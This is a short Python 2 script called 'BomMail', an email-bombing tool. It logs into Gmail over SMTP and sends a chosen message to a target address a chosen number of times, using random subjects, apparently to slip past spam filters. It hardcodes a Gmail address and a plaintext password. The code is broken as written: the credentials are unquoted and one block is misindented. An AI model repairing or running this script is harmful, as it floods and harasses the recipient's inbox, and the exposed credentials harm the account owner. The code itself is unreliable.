#!/usr/bin/python
#BomMail

import os
import smtplib
import getpass
import sys
import time

print """
hahahahahhahahahahahahahahahahaha  
"""
def BomEmail():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')


user = hsiehjason00@gmail.com
passwd = Jj978645312


to = raw_input('\nTo: ')
#subject = raw_input('Subject: ')
body = raw_input('Message: ')
total = input('Number of send: ')

    smtp_server = 'smtp.gmail.com'
    port = 587

print ''

try:
    server = smtplib.SMTP(smtp_server,port)
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
        server.sendmail(user,to,msg)
        print "\r[+]E-mails sent: %i" % i
        sys.stdout.flush()
    server.quit()
    print '\n Done  !!!'
    print '                                                  BomMail :~ Enjoy :)'
except KeyboardInterrupt:
    print '[-] Canceled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] Allow access to less secure apps on your gmail account. https://www.google.com/settings/security/lesssecureapps'
    sys.exit()
